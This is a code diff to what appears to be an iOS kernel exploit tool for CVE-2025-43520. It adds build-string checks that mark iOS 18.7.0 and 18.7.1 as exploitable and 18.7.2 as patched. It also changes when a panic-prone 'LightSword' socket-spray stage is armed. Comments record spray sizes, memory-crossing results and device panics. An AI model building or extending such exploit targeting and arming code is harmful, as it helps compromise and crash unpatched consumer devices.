@@ -65,6 +65,7 @@ static NSString *cs2_sysctl_string(NSString *name) {
 /* CVE-2025-43520 viability gate (patched 18.7.2 / 26.1).
    Same rule as Lum1na project Lum1naCS2Core.m cs2_cve43520_viable().
    <= 21 (16.x/17.x) = pre-patch VIABLE; 22A-22G (18.0-18.6.x) VIABLE;
+   22H<124 (18.7.0/18.7.1, e.g. 22H31) VIABLE; 22H124 (18.7.2) PATCHED;
    23A (26.0.x) VIABLE; anything 23B+ = PATCHED — hop-1 cluster_*_contig
    returns EINVAL and firing the spray only starves configd (A12X_23G71
    watchdog panic 2026-10-20 21:59, panic-full-2026-10-20-215932.ips). */
@@ -75,7 +76,12 @@ static BOOL cs2_cve43520_viable(void) {
     char train = 0;
     if (sscanf(v, "%2d%c%d", &major, &train, &rev) < 2) return NO;
     if (major <= 21) return YES;
-    if (major == 22) return (train >= 'A' && train <= 'G');
+    if (major == 22) {
+        if (train >= 'A' && train <= 'G') return YES;
+        /* 18.7.x: 22H31 (18.7.1) pre-fix -> viable; 22H124 (18.7.2) patched. */
+        if (train == 'H') return rev < 124;
+        return NO;
+    }
     if (major == 23) return (train == 'A');
     return NO;
 }
@@ -136,8 +142,9 @@ static void cs2_write_banner(void) {
    24A435/27.0: 5 WRONG crossings over distinct boots (0xba0000, 0x57c0000 x3
    same foreign page-id, 0x6840000, 0x7ee0000) with zero configd starvation
    across a dozen 400k-900k-socket sprays. Two arm shapes:
-     - AUTO-LICENSE: calib hot set >= 8 windows on THIS device (no toggle).
-     - EXPLICIT: Documents/lswkrw_arm.txt present (lswarm toggle) + >= 1 window.
+     - EXPLICIT ONLY (2026-11-07): Documents/lswkrw_arm.txt (lswarm toggle)
+       plus >= 1 calib window. The old auto-license (hot set >= 8, no file)
+       fired the ladder on patched trains and is removed — panic-first.
    Panic possible; one tap per fresh boot; ladder prints are the dial-finder. */
 static BOOL lsword_arm_licensed(int *windows, BOOL *explicit_arm) {
     *windows = 0;
@@ -156,8 +163,10 @@ static BOOL lsword_arm_licensed(int *windows, BOOL *explicit_arm) {
             }];
     }
     *windows = n;
-    if (*explicit_arm) return n >= 1;
-    return n >= 8;
+    /* 2026-11-07: no auto-license. LightSword is PANIC-POSSIBLE, so arm it
+       only through the explicit Documents/lswkrw_arm.txt toggle. A calib hot
+       set alone no longer fires the ladder on a patched train. */
+    return *explicit_arm && n >= 1;
 }
 
 @implementation CS2Runner
